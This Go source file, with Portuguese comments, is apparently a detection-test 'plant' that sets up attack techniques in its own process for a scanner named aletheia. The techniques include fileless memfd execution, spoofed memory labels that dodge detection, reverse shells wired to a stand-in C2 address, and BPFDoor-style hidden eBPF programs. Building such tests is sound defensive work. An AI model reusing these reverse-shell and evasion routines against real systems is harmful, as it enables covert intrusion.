// plant monta UMA técnica de ataque no próprio processo e dorme, para a
// aletheia escaneá-lo. É material de TESTE da matriz adversarial — não é
// malicioso: cada técnica é a forma estrutural que um check afirma pegar (ou
// que se quer provar como ponto cego), montada de propósito para ser detectada.
//
// SEGURANÇA: tudo é userspace e local. Nada carrega módulo, nada conecta na
// internet (os cenários de rede usam TEST-NET-3, 203.0.113.0/24, que nunca é
// roteada), nada escreve fora de /tmp. Roda no contêiner descartável da matriz.
package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

// Números de syscall que o pacote syscall da stdlib não exporta (só o
// x/sys/unix, e este projeto não tem dependência externa). São de amd64, onde a
// matriz roda.
const (
	sysMemfdCreate = 319
	sysExecveat    = 322
	sysBPF         = 321
)

func must(err error, o string) {
	if err != nil {
		fmt.Fprintln(os.Stderr, o+":", err)
		os.Exit(1)
	}
}

// nomearVMA dá um rótulo a uma região anônima (PR_SET_VMA_ANON_NAME, 5.17+).
// É o que o JIT moderno faz — e o que um payload pode COPIAR para se esconder
// do proc.maps_exec_anon, que só conta região SEM rótulo. O kernel exibe o nome
// como "[anon:NOME]" e REJEITA colchetes no argumento: passa-se só o NOME.
func nomearVMA(b []byte, nome string) {
	const prSetVMA = 0x53564d41
	n := append([]byte(nome), 0)
	syscall.Syscall6(syscall.SYS_PRCTL, prSetVMA, 0,
		uintptr(unsafe.Pointer(&b[0])), uintptr(len(b)), uintptr(unsafe.Pointer(&n[0])), 0)
}

func bptr(sarg string) *byte {
	b, err := syscall.BytePtrFromString(sarg)
	must(err, "byteptr")
	return b
}

func mmapAnon(prot int) []byte {
	b, err := syscall.Mmap(-1, 0, 4096, prot, syscall.MAP_PRIVATE|syscall.MAP_ANON)
	must(err, "mmap anon")
	copy(b, []byte{0x90, 0x90, 0xc3})
	return b
}

// mapDeArquivo mapeia um arquivo e opcionalmente o apaga (deixando o mapeamento
// "(deleted)"). É a lib aberta com dlopen e removida em seguida.
func mapDeArquivo(path string, prot int, apagar bool) []byte {
	must(os.WriteFile(path, make([]byte, 8192), 0o755), "write "+path)
	fh, err := os.Open(path)
	must(err, "open "+path)
	b, err := syscall.Mmap(int(fh.Fd()), 0, 8192, prot, syscall.MAP_PRIVATE)
	must(err, "mmap "+path)
	if apagar {
		os.Remove(path)
	}
	return b
}

// carregarCgroupSkb carrega um programa cgroup_skb mínimo (r0=1; exit) e
// devolve o descritor. É o que um implante de cgroup BPF faz — sem o payload.
func carregarCgroupSkb() int { return carregarBPF(8 /*CGROUP_SKB*/, 1) }

// carregarBPF carrega um eBPF trivial (MOV64 R0, ret; EXIT) de um tipo dado e
// devolve o fd. Serve para plantar DETENTORES: cgroup, tc, XDP, ação. O valor de
// retorno só precisa passar o verificador de cada tipo (XDP_PASS, TC_ACT_*, etc.).
func carregarBPF(progType, ret uint32) int {
	insns := []byte{
		0xb7, 0, 0, 0, byte(ret), byte(ret >> 8), byte(ret >> 16), byte(ret >> 24), // MOV64 R0, ret
		0x95, 0, 0, 0, 0, 0, 0, 0, // BPF_EXIT
	}
	lic := []byte("GPL\x00")
	log := make([]byte, 4096)
	var a struct {
		progType, insnCnt  uint32
		insns, license     uint64
		logLevel, logSize  uint32
		logBuf             uint64
		kernVer, progFlags uint32
	}
	a.progType = progType
	a.insnCnt = 2
	a.insns = uint64(uintptr(unsafe.Pointer(&insns[0])))
	a.license = uint64(uintptr(unsafe.Pointer(&lic[0])))
	a.logLevel, a.logSize = 1, uint32(len(log))
	a.logBuf = uint64(uintptr(unsafe.Pointer(&log[0])))
	fd, _, e := syscall.Syscall(sysBPF, 5 /*BPF_PROG_LOAD*/, uintptr(unsafe.Pointer(&a)), unsafe.Sizeof(a))
	runtime.KeepAlive(insns)
	runtime.KeepAlive(lic)
	runtime.KeepAlive(log)
	if e != 0 {
		must(fmt.Errorf("%v — %s", e, log), "BPF_PROG_LOAD")
	}
	return int(fd)
}

func anexarCgroup(cgFD, progFD int) {
	var a struct{ targetFD, attachBpfFD, attachType, attachFlags uint32 }
	a.targetFD = uint32(cgFD)
	a.attachBpfFD = uint32(progFD)
	a.attachType = 0 // BPF_CGROUP_INET_INGRESS
	_, _, e := syscall.Syscall(sysBPF, 8 /*BPF_PROG_ATTACH*/, uintptr(unsafe.Pointer(&a)), unsafe.Sizeof(a))
	if e != 0 {
		must(fmt.Errorf("%v", e), "BPF_PROG_ATTACH")
	}
}

// --- netlink cru: prender programa a INTERFACE (tc/XDP) ou a uma AÇÃO ---
//
// A aletheia LÊ esses anexos por rtnetlink (RTM_GETLINK/GETTFILTER/GETACTION);
// aqui a matriz os MONTA, para provar que a leitura casa com a escrita real do
// kernel — o mesmo TLV, do lado de construir. Números de if_link.h, pkt_cls.h,
// tc_act/tc_bpf.h; amd64.
const (
	rtmSetLink    = 19
	rtmNewQdisc   = 36
	rtmNewTFilter = 44
	rtmNewAction  = 48

	iflaXDP      = 43 // IFLA_XDP (aninhado)
	iflaXDPFD    = 1  // IFLA_XDP_FD
	iflaXDPFlags = 3  // IFLA_XDP_FLAGS
	xdpSKBMode   = 2  // XDP_FLAGS_SKB_MODE (lo só aceita XDP genérico)

	tcaKind    = 1 // TCA_KIND
	tcaOptions = 2 // TCA_OPTIONS
	tcaBPFFD   = 6 // TCA_BPF_FD (cls_bpf)
	tcaBPFName = 7 // TCA_BPF_NAME
	tcaBPFFlag = 8 // TCA_BPF_FLAGS
	bpfActDir  = 1 // TCA_BPF_FLAG_ACT_DIRECT

	tcaActTab      = 1 // TCA_ACT_TAB / TCA_ROOT_TAB
	tcaActKind     = 1 // TCA_ACT_KIND
	tcaActOptions  = 2 // TCA_ACT_OPTIONS
	tcaActBPFParms = 2 // TCA_ACT_BPF_PARMS (struct tc_act_bpf, obrigatório)
	tcaActBPFFD    = 5 // TCA_ACT_BPF_FD
	tcaActBPFName  = 6 // TCA_ACT_BPF_NAME

	clsactHandle = 0xFFFF0000 // TC_H_MAKE(TC_H_CLSACT, 0)
	clsactParent = 0xFFFFFFF1 // TC_H_CLSACT
	ingressPar   = 0xFFFFFFF2 // TC_H_MAKE(TC_H_CLSACT, TC_H_MIN_INGRESS)
)

func nlattr(tipo uint16, payload []byte) []byte {
	tam := 4 + len(payload)
	b := make([]byte, (tam+3)&^3)
	binary.LittleEndian.PutUint16(b[0:2], uint16(tam))
	binary.LittleEndian.PutUint16(b[2:4], tipo)
	copy(b[4:], payload)
	return b
}

func nlattrU32(tipo uint16, v uint32) []byte {
	var p [4]byte
	binary.LittleEndian.PutUint32(p[:], v)
	return nlattr(tipo, p[:])
}

// netlinkReq envia UMA mensagem rtnetlink com ACK e aborta se o kernel recusar.
func netlinkReq(tipo, flags uint16, corpo []byte) {
	fd, err := syscall.Socket(syscall.AF_NETLINK, syscall.SOCK_RAW, syscall.NETLINK_ROUTE)
	must(err, "socket netlink")
	defer syscall.Close(fd)
	must(syscall.Bind(fd, &syscall.SockaddrNetlink{Family: syscall.AF_NETLINK}), "bind netlink")

	tam := 16 + len(corpo)
	msg := make([]byte, tam)
	binary.LittleEndian.PutUint32(msg[0:4], uint32(tam))
	binary.LittleEndian.PutUint16(msg[4:6], tipo)
	binary.LittleEndian.PutUint16(msg[6:8], flags|syscall.NLM_F_REQUEST|syscall.NLM_F_ACK)
	binary.LittleEndian.PutUint32(msg[8:12], 1) // seq
	copy(msg[16:], corpo)
	must(syscall.Sendto(fd, msg, 0, &syscall.SockaddrNetlink{Family: syscall.AF_NETLINK}), "sendto netlink")

	resp := make([]byte, 8192)
	n, _, err := syscall.Recvfrom(fd, resp, 0)
	must(err, "recvfrom netlink")
	// NLMSG_ERROR (2): o corpo começa com int32 errno (0 = ACK de sucesso).
	if n >= 20 && binary.LittleEndian.Uint16(resp[4:6]) == syscall.NLMSG_ERROR {
		if errno := int32(binary.LittleEndian.Uint32(resp[16:20])); errno != 0 {
			must(syscall.Errno(-errno), "netlink recusou")
		}
	}
}

func loIndice() int {
	i, err := net.InterfaceByName("lo")
	must(err, "achar lo")
	return i.Index
}

// anexarXDP prende um programa XDP (modo genérico) ao caminho de recepção de lo.
func anexarXDP(progFD, ifindex int) {
	xdp := append(nlattrU32(iflaXDPFD, uint32(progFD)), nlattrU32(iflaXDPFlags, xdpSKBMode)...)
	corpo := make([]byte, 16) // ifinfomsg
	corpo[0] = syscall.AF_UNSPEC
	binary.LittleEndian.PutUint32(corpo[4:8], uint32(ifindex))
	corpo = append(corpo, nlattr(iflaXDP, xdp)...)
	netlinkReq(rtmSetLink, 0, corpo)
}

// anexarTC cria o qdisc clsact e prende um cls_bpf no ingress de lo.
func anexarTC(progFD, ifindex int) {
	q := make([]byte, 20) // tcmsg
	q[0] = syscall.AF_UNSPEC
	binary.LittleEndian.PutUint32(q[4:8], uint32(ifindex))
	binary.LittleEndian.PutUint32(q[8:12], clsactHandle)
	binary.LittleEndian.PutUint32(q[12:16], clsactParent)
	q = append(q, nlattr(tcaKind, []byte("clsact\x00"))...)
	netlinkReq(rtmNewQdisc, syscall.NLM_F_CREATE|syscall.NLM_F_EXCL, q)

	opts := nlattrU32(tcaBPFFD, uint32(progFD))
	opts = append(opts, nlattr(tcaBPFName, []byte("plant_cls\x00"))...)
	opts = append(opts, nlattrU32(tcaBPFFlag, bpfActDir)...)
	f := make([]byte, 20) // tcmsg
	f[0] = syscall.AF_UNSPEC
	binary.LittleEndian.PutUint32(f[4:8], uint32(ifindex))
	binary.LittleEndian.PutUint32(f[12:16], ingressPar)
	binary.LittleEndian.PutUint32(f[16:20], 0x00010300) // info: prio 1, ETH_P_ALL
	f = append(f, nlattr(tcaKind, []byte("bpf\x00"))...)
	f = append(f, nlattr(tcaOptions, opts)...)
	netlinkReq(rtmNewTFilter, syscall.NLM_F_CREATE|syscall.NLM_F_EXCL, f)
}

// anexarActBPF cria uma AÇÃO de tc standalone (act_bpf), que nenhum filtro
// referencia — a que só RTM_GETACTION alcança.
func anexarActBPF(progFD int) {
	parms := make([]byte, 20)                     // struct tc_act_bpf (tc_gen): index=0 -> kernel atribui
	binary.LittleEndian.PutUint32(parms[8:12], 3) // action = TC_ACT_PIPE
	opts := nlattr(tcaActBPFParms, parms)
	opts = append(opts, nlattrU32(tcaActBPFFD, uint32(progFD))...)
	opts = append(opts, nlattr(tcaActBPFName, []byte("plant_act\x00"))...)
	acao := nlattr(tcaActKind, []byte("bpf\x00"))
	acao = append(acao, nlattr(tcaActOptions, opts)...)
	entrada := nlattr(1, acao)               // ação no índice 1 da tabela
	tab := nlattr(tcaActTab, entrada)        // TCA_ACT_TAB
	corpo := append(make([]byte, 4), tab...) // tcamsg (family + pad) + tabela
	netlinkReq(rtmNewAction, syscall.NLM_F_CREATE|syscall.NLM_F_EXCL, corpo)
}

// vivos impede o GC de fechar sockets e pipes que a técnica precisa manter
// abertos enquanto a aletheia escaneia.
var vivos []any

// destinoC2 é TEST-NET-3: reservado para documentação, NUNCA roteado. A conexão
// é local (o listener está no mesmo contêiner), então o peer é "público" pela
// classificação sem que nada saia para a internet.
const destinoC2 = "203.0.113.5:4444"

// ioctls do PTY (amd64).
const (
	tiocGPTN   = 0x80045430
	tiocSPTLCK = 0x40045431
)

func ioctl(fd, req, arg uintptr) {
	syscall.Syscall(syscall.SYS_IOCTL, fd, req, arg)
}

func socketFD(c net.Conn) int {
	f, err := c.(*net.TCPConn).File()
	must(err, "file do socket")
	vivos = append(vivos, c, f)
	return int(f.Fd())
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "uso: plant <tecnica>")
		os.Exit(2)
	}
	var manter [][]byte
	anunciou := false
	switch os.Args[1] {
	// --- REGRESSÃO: cada uma é o que um check afirma pegar ---
	case "rwx-anon": // proc.maps_rwx_anon
		manter = append(manter, mmapAnon(syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC))
	case "rx-anon": // proc.maps_exec_anon (W^X: mmap RW -> mprotect RX)
		b := mmapAnon(syscall.PROT_READ | syscall.PROT_WRITE)
		must(syscall.Mprotect(b, syscall.PROT_READ|syscall.PROT_EXEC), "mprotect")
		manter = append(manter, b)
	case "deleted-exec": // proc.deleted_mapping (CRITICAL, /tmp)
		manter = append(manter, mapDeArquivo("/tmp/.plant.so", syscall.PROT_READ|syscall.PROT_EXEC, true))
	case "memfd": // proc.memfd_exec: executa a partir de memória anônima, sem disco
		self, err := os.ReadFile("/proc/self/exe")
		must(err, "ler self")
		fd, _, e1 := syscall.Syscall(sysMemfdCreate, uintptr(unsafe.Pointer(bptr("plant"))), 0, 0)
		if e1 != 0 {
			must(e1, "memfd_create")
		}
		_, err = syscall.Write(int(fd), self)
		must(err, "escrever no memfd")
		// execveat(fd, "", [plant, memfd-child], {}, AT_EMPTY_PATH): substitui a
		// imagem por uma que veio de memória. O exe do processo vira /memfd:...
		argv := []*byte{bptr("plant"), bptr("memfd-child"), nil}
		envp := []*byte{nil}
		syscall.Syscall6(sysExecveat, fd, uintptr(unsafe.Pointer(bptr(""))),
			uintptr(unsafe.Pointer(&argv[0])), uintptr(unsafe.Pointer(&envp[0])), 0x1000, 0)
		must(fmt.Errorf("execveat não substituiu a imagem"), "execveat")
	case "memfd-child": // a imagem que veio do memfd: só se anuncia e dorme
		fmt.Printf("PLANT pid=%d tech=memfd\n", os.Getpid())
		os.Stdout.Sync()
		time.Sleep(120 * time.Second)
		return

	// --- PONTO CEGO: técnicas que se quer medir se passam sem sinal ---
	case "rx-anon-rotulada": // maps_exec_anon só conta SEM rótulo: rótulo spoofado esconde
		b := mmapAnon(syscall.PROT_READ | syscall.PROT_WRITE)
		must(syscall.Mprotect(b, syscall.PROT_READ|syscall.PROT_EXEC), "mprotect")
		nomearVMA(b, "js-executable-memory")
		manter = append(manter, b)
	case "deleted-data": // deleted_mapping exige EXECUTÁVEL: segmento de dado apagado passa
		manter = append(manter, mapDeArquivo("/tmp/.plantd.so", syscall.PROT_READ|syscall.PROT_WRITE, true))

	case "jit-inject": // maps_exec_anon isenta JIT em diretório de sistema: o
		// runner roda ISTO como /usr/bin/node, e a região sem rótulo é isenta.
		b := mmapAnon(syscall.PROT_READ | syscall.PROT_WRITE)
		must(syscall.Mprotect(b, syscall.PROT_READ|syscall.PROT_EXEC), "mprotect")
		manter = append(manter, b)

	case "listen": // sobe o C2 falso e segura as conexões aceitas ESTABELECIDAS
		ln, err := net.Listen("tcp", destinoC2)
		must(err, "listen "+destinoC2)
		fmt.Printf("LISTEN em %s\n", destinoC2)
		os.Stdout.Sync()
		for {
			c, err := ln.Accept()
			if err != nil {
				continue
			}
			vivos = append(vivos, c)
		}

	case "revshell-direct": // correlate.revshell: fd 0,1,2 no MESMO socket de saída
		c, err := net.Dial("tcp", destinoC2)
		must(err, "dial")
		sfd := socketFD(c)
		fmt.Printf("PLANT pid=%d tech=revshell-direct\n", os.Getpid())
		os.Stdout.Sync()
		anunciou = true
		syscall.Dup2(sfd, 0)
		syscall.Dup2(sfd, 1)
		syscall.Dup2(sfd, 2)

	case "revshell-bridge": // correlate.revshell_bridge: shell lê de pipe, ponte
		// (este processo) segura o outro lado do pipe e o socket de saída.
		c, err := net.Dial("tcp", destinoC2)
		must(err, "dial")
		_ = socketFD(c) // a ponte (nós) segura o socket
		r, w, err := os.Pipe()
		must(err, "pipe")
		vivos = append(vivos, w) // a ponte segura a ponta de ESCRITA
		nul, _ := os.OpenFile(os.DevNull, os.O_RDWR, 0)
		// o shell REAL: stdin = ponta de LEITURA do pipe, comm vira "sh".
		shPid, err := syscall.ForkExec("/bin/sh", []string{"sh", "-i"}, &syscall.ProcAttr{
			Files: []uintptr{r.Fd(), nul.Fd(), nul.Fd()},
		})
		must(err, "forkexec sh")
		r.Close() // só o shell precisa da leitura
		fmt.Printf("PLANT pid=%d tech=revshell-bridge\n", shPid)
		os.Stdout.Sync()
		anunciou = true

	case "revshell-pty": // ponte por PTY: o revshell_bridge só cobre pipe, e o
		// PTY não compartilha inode de pipe — o ponto cego declarado.
		c, err := net.Dial("tcp", destinoC2)
		must(err, "dial")
		_ = socketFD(c) // a ponte segura o socket
		ptmx, err := os.OpenFile("/dev/ptmx", os.O_RDWR, 0)
		must(err, "abrir /dev/ptmx")
		vivos = append(vivos, ptmx)
		var lock int
		ioctl(ptmx.Fd(), tiocSPTLCK, uintptr(unsafe.Pointer(&lock)))
		var n uint32
		ioctl(ptmx.Fd(), tiocGPTN, uintptr(unsafe.Pointer(&n)))
		slave, err := os.OpenFile(fmt.Sprintf("/dev/pts/%d", n), os.O_RDWR, 0)
		must(err, "abrir o slave do pty")
		// o shell REAL com stdin/stdout/stderr = slave do PTY.
		shPid, err := syscall.ForkExec("/bin/sh", []string{"sh", "-i"}, &syscall.ProcAttr{
			Files: []uintptr{slave.Fd(), slave.Fd(), slave.Fd()},
		})
		must(err, "forkexec sh")
		slave.Close()
		fmt.Printf("PLANT pid=%d tech=revshell-pty\n", shPid)
		os.Stdout.Sync()
		anunciou = true

	case "cgroup-attach": // kernel.bpf: programa de cgroup atribuído por BPF_PROG_QUERY
		prog := carregarCgroupSkb()
		cgfd, err := syscall.Open("/sys/fs/cgroup", syscall.O_RDONLY, 0)
		must(err, "abrir /sys/fs/cgroup")
		anexarCgroup(cgfd, prog)
		// fecha o fd do PROGRAMA: o único detentor agora é o anexo no cgroup.
		// Sem isso, o descritor aberto já atribuiria, e não seria o cgroup query
		// que estaria sendo provado.
		syscall.Close(prog)
		syscall.Close(cgfd)

	case "xdp": // rede.bpf: programa XDP preso a lo, atribuído por RTM_GETLINK
		prog := carregarBPF(6 /*XDP*/, 2 /*XDP_PASS*/)
		anexarXDP(prog, loIndice())
		syscall.Close(prog) // só o anexo em lo segura o programa

	case "tc-filter": // rede.bpf: cls_bpf no ingress de lo, atribuído por RTM_GETTFILTER
		prog := carregarBPF(3 /*SCHED_CLS*/, 0)
		anexarTC(prog, loIndice())
		syscall.Close(prog)

	case "act-bpf": // rede.bpf: ação act_bpf standalone, atribuída por RTM_GETACTION
		prog := carregarBPF(4 /*SCHED_ACT*/, 3 /*TC_ACT_PIPE*/)
		anexarActBPF(prog)
		syscall.Close(prog)

	case "netns-legacy": // rede.bpf: cls_bpf preso DENTRO de OUTRO netns — o
		// rtnetlink da aletheia (no netns dela) não o vê; a aletheia deve
		// DECLARAR a lacuna em vez de silenciar (nunca por setns).
		runtime.LockOSThread() // NÃO desbloquear: a thread fica presa no netns novo
		must(syscall.Unshare(syscall.CLONE_NEWNET), "unshare netns")
		prog := carregarBPF(3 /*SCHED_CLS*/, 0)
		anexarTC(prog, loIndice()) // lo do netns NOVO (ifindex 1)
		syscall.Close(prog)

	case "bpfdoor": // BPFDoor: socket_filter órfão de fd/pin/link, preso por um
		// socket que o processo segura, e compartilhando um MAP com ele. É o
		// caso P11/P12: sem correlacionar prog->map->PID, o programa aparece
		// sem dono. Mede-se o comportamento ATUAL; a expectativa vem do
		// resultado, não de suposição.
		plantarBPFDoor()

	case "sockmap": // FixMapa: um sk_skb preso por um SOCKMAP (STREAM_VERDICT),
		// órfão de fd. É o tipo "segurado por MAPA" que o kernel.bpf_unowned
		// declara em lacuna mas que NENHUM teste de kernel real exercia — só
		// struct montada em unit test (tautológico). Aqui o programa é real,
		// carregado num kernel real: a matriz MEDE se a aletheia (a) o vê no
		// inventário e (b) declara a lacuna FixMapa — nunca silêncio nem CRÍTICO
		// falso.
		plantarSockmap()

	default:
		fmt.Fprintln(os.Stderr, "técnica desconhecida:", os.Args[1])
		os.Exit(2)
	}
	_ = manter
	if !anunciou {
		fmt.Printf("PLANT pid=%d tech=%s\n", os.Getpid(), os.Args[1])
		os.Stdout.Sync()
	}
	time.Sleep(120 * time.Second)
}

// criarSockmap cria um BPF_MAP_TYPE_SOCKMAP e devolve o fd. É o mapa que SEGURA
// o programa sk_skb: enquanto o processo mantém este fd aberto, o anexo
// STREAM_VERDICT mantém o programa vivo mesmo depois de fechado o fd do prog.
func criarSockmap() int {
	var a struct {
		mapType, keySize, valueSize, maxEntries uint32
		mapFlags, innerMapFD, numaNode          uint32
		mapName                                 [16]byte
	}
	a.mapType = 15 // BPF_MAP_TYPE_SOCKMAP
	a.keySize, a.valueSize, a.maxEntries = 4, 4, 8
	copy(a.mapName[:], "plant_skm")
	fd, _, e := syscall.Syscall(sysBPF, 0 /*BPF_MAP_CREATE*/, uintptr(unsafe.Pointer(&a)), unsafe.Sizeof(a))
	if e != 0 {
		must(fmt.Errorf("%v", e), "BPF_MAP_CREATE sockmap")
	}
	return int(fd)
}

// carregarSkSkb carrega um programa BPF_PROG_TYPE_SK_SKB trivial (devolve
// SK_PASS). expected_attach_type = STREAM_VERDICT porque o kernel casa o tipo
// esperado da carga com o do anexo. Devolve o fd do programa.
func carregarSkSkb() int {
	insns := []byte{
		0xb7, 0, 0, 0, 1, 0, 0, 0, // MOV64 R0, 1 (SK_PASS)
		0x95, 0, 0, 0, 0, 0, 0, 0, // BPF_EXIT
	}
	lic := []byte("GPL\x00")
	log := make([]byte, 4096)
	var a struct {
		progType, insnCnt  uint32
		insns, license     uint64
		logLevel, logSize  uint32
		logBuf             uint64
		kernVer, progFlags uint32
		progName           [16]byte
		progIfindex        uint32
		expectedAttachType uint32
	}
	a.progType = 14 // BPF_PROG_TYPE_SK_SKB
	a.insnCnt = 2
	a.insns = uint64(uintptr(unsafe.Pointer(&insns[0])))
	a.license = uint64(uintptr(unsafe.Pointer(&lic[0])))
	a.logLevel, a.logSize = 1, uint32(len(log))
	a.logBuf = uint64(uintptr(unsafe.Pointer(&log[0])))
	copy(a.progName[:], "plant_skskb")
	a.expectedAttachType = 5 // BPF_SK_SKB_STREAM_VERDICT
	fd, _, e := syscall.Syscall(sysBPF, 5 /*BPF_PROG_LOAD*/, uintptr(unsafe.Pointer(&a)), unsafe.Sizeof(a))
	runtime.KeepAlive(insns)
	runtime.KeepAlive(lic)
	runtime.KeepAlive(log)
	if e != 0 {
		must(fmt.Errorf("%v — %s", e, log), "BPF_PROG_LOAD sk_skb")
	}
	return int(fd)
}

// anexarSockmapVerdict prende o programa sk_skb ao SOCKMAP como STREAM_VERDICT.
// O anexo passa a ser o detentor do programa — quando o fd do prog fecha, é o
// mapa (que o processo ainda segura) o único fio de volta ao PID.
func anexarSockmapVerdict(mapFD, progFD int) {
	var a struct{ targetFD, attachBpfFD, attachType, attachFlags uint32 }
	a.targetFD = uint32(mapFD)
	a.attachBpfFD = uint32(progFD)
	a.attachType = 5 // BPF_SK_SKB_STREAM_VERDICT
	_, _, e := syscall.Syscall(sysBPF, 8 /*BPF_PROG_ATTACH*/, uintptr(unsafe.Pointer(&a)), unsafe.Sizeof(a))
	if e != 0 {
		must(fmt.Errorf("%v", e), "BPF_PROG_ATTACH sockmap verdict")
	}
}

// plantarSockmap monta o sk_skb-preso-por-sockmap e o deixa órfão de fd,
// segurando o mapa aberto. Imprime prog_id/map_id (antes de fechar o prog) para
// a matriz confirmar o achado sobre ESTE objeto, não outro BPF vivo na VM.
func plantarSockmap() {
	mapFD := criarSockmap() // o processo SEGURA o sockmap
	prog := carregarSkSkb()
	anexarSockmapVerdict(mapFD, prog)
	progID := idDoObjetoBPF(prog)
	mapID := idDoObjetoBPF(mapFD)
	syscall.Close(prog) // órfão de fd: quem o segura é o anexo do sockmap
	fmt.Printf("PLANT pid=%d prog_id=%d map_id=%d sockmap: sk_skb preso por SOCKMAP, órfão de fd\n",
		os.Getpid(), progID, mapID)
	os.Stdout.Sync()
	for {
		time.Sleep(time.Hour)
	}
}

// criarMapa cria um BPF_MAP (array de 1 elemento) e devolve o fd. É o que um
// implante compartilha com o processo que o hospeda — e o único fio que
// ligaria o programa órfão de volta ao PID, se a ferramenta seguisse
// prog->map->PID.
func criarMapa() int {
	var a struct {
		mapType, keySize, valueSize, maxEntries uint32
		mapFlags, innerMapFD, numaNode          uint32
		mapName                                 [16]byte
	}
	a.mapType = 2 // BPF_MAP_TYPE_ARRAY
	a.keySize, a.valueSize, a.maxEntries = 4, 8, 1
	fd, _, e := syscall.Syscall(sysBPF, 0 /*BPF_MAP_CREATE*/, uintptr(unsafe.Pointer(&a)), unsafe.Sizeof(a))
	if e != 0 {
		must(fmt.Errorf("%v", e), "BPF_MAP_CREATE")
	}
	return int(fd)
}

// carregarSocketFilterComMapa carrega um socket_filter que REFERENCIA o mapa
// (uma instrução LD_MAP_FD), para que exista o vínculo prog->map. O programa é
// trivial no resto: devolve 0. Devolve o fd do programa.
func carregarSocketFilterComMapa(mapFD int) int {
	// BPF_LD_MAP_FD(R1, map_fd) — o LD_IMM64 pseudo que cria a referência
	// prog->map. A codificação exata importa (conferida contra
	// samples/bpf/bpf_insn.h e struct bpf_insn do UAPI):
	//
	//   struct bpf_insn { u8 code; u8 dst_reg:4, src_reg:4; s16 off; s32 imm; }
	//
	// O segundo byte empacota dst_reg no nibble BAIXO e src_reg no ALTO. Para
	// dst=R1 e src=BPF_PSEUDO_MAP_FD(=1) isso é 0x11, NÃO 0x01 — com 0x01 o
	// src_reg é 0, e o kernel lê um LD_IMM64 COMUM que carrega o valor do fd
	// como constante em R1 (que nem é usado), sem referência ao mapa nenhuma. E
	// a segunda metade do LD_IMM64 leva a parte ALTA do immediate, que para um
	// fd pequeno é 0 — não 1.
	insns := []byte{
		0x18, 0x11, 0, 0, byte(mapFD), byte(mapFD >> 8), byte(mapFD >> 16), byte(mapFD >> 24),
		0x00, 0x00, 0, 0, 0, 0, 0, 0, // parte ALTA do immediate de 64 bits: 0
		0xb7, 0, 0, 0, 0, 0, 0, 0, // MOV64 R0, 0
		0x95, 0, 0, 0, 0, 0, 0, 0, // EXIT
	}
	lic := []byte("GPL\x00")
	log := make([]byte, 4096)
	var a struct {
		progType, insnCnt  uint32
		insns, license     uint64
		logLevel, logSize  uint32
		logBuf             uint64
		kernVer, progFlags uint32
	}
	a.progType = 1 // BPF_PROG_TYPE_SOCKET_FILTER
	a.insnCnt = 4
	a.insns = uint64(uintptr(unsafe.Pointer(&insns[0])))
	a.license = uint64(uintptr(unsafe.Pointer(&lic[0])))
	a.logLevel, a.logSize = 1, uint32(len(log))
	a.logBuf = uint64(uintptr(unsafe.Pointer(&log[0])))
	fd, _, e := syscall.Syscall(sysBPF, 5 /*BPF_PROG_LOAD*/, uintptr(unsafe.Pointer(&a)), unsafe.Sizeof(a))
	runtime.KeepAlive(insns)
	runtime.KeepAlive(lic)
	runtime.KeepAlive(log)
	if e != 0 {
		must(fmt.Errorf("%v — %s", e, log), "BPF_PROG_LOAD socket_filter")
	}
	return int(fd)
}

// idDoObjetoBPF lê o id que o kernel atribui a um programa ou mapa, por
// BPF_OBJ_GET_INFO_BY_FD. O id fica no offset 4 tanto do bpf_prog_info quanto do
// bpf_map_info (type u32 em 0, id u32 em 4). Devolve 0 se falhar.
func idDoObjetoBPF(fd int) uint32 {
	info := make([]byte, 256)
	var a struct {
		bpfFD, infoLen uint32
		info           uint64
	}
	a.bpfFD = uint32(fd)
	a.infoLen = uint32(len(info))
	a.info = uint64(uintptr(unsafe.Pointer(&info[0])))
	_, _, e := syscall.Syscall(sysBPF, 15, /*BPF_OBJ_GET_INFO_BY_FD*/
		uintptr(unsafe.Pointer(&a)), unsafe.Sizeof(a))
	runtime.KeepAlive(info)
	if e != 0 {
		return 0
	}
	return uint32(info[4]) | uint32(info[5])<<8 | uint32(info[6])<<16 | uint32(info[7])<<24
}

func plantarBPFDoor() {
	mapFD := criarMapa() // o processo SEGURA o mapa
	prog := carregarSocketFilterComMapa(mapFD)

	// SO_ATTACH_BPF funciona em QUALQUER socket, não só no raw de pacote — e o
	// AF_PACKET nem sempre está no kernel (o LTS mínimo da VM não tem). Um UDP
	// serve: o socket passa a segurar o programa igual, e é o socket que fica
	// sendo o detentor órfão de fd. A mecânica de atribuição testada é a mesma.
	sk, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0)
	must(err, "socket UDP")
	const soAttachBPF = 50
	_, _, e := syscall.Syscall6(syscall.SYS_SETSOCKOPT, uintptr(sk), syscall.SOL_SOCKET,
		soAttachBPF, uintptr(unsafe.Pointer(&prog)), 4, 0)
	if e != 0 {
		must(fmt.Errorf("%v", e), "SO_ATTACH_BPF")
	}
	// Os ids ANTES de fechar o fd do programa: é por eles que a matriz confirma
	// que o achado é DESTE programa, não de outro objeto BPF vivo na VM.
	progID := idDoObjetoBPF(prog)
	mapID := idDoObjetoBPF(mapFD)
	// Fecha o fd do PROGRAMA: agora ele é órfão de descritor. Quem o segura é o
	// socket; e o único fio de volta ao PID, além do socket, é o mapa que este
	// processo ainda tem aberto.
	syscall.Close(prog)
	fmt.Printf("PLANT pid=%d prog_id=%d map_id=%d bpfdoor: socket_filter órfão de fd, preso pelo socket, mapa compartilhado\n",
		os.Getpid(), progID, mapID)
	// segura socket e mapa abertos e dorme
	for {
		time.Sleep(time.Hour)
	}
}
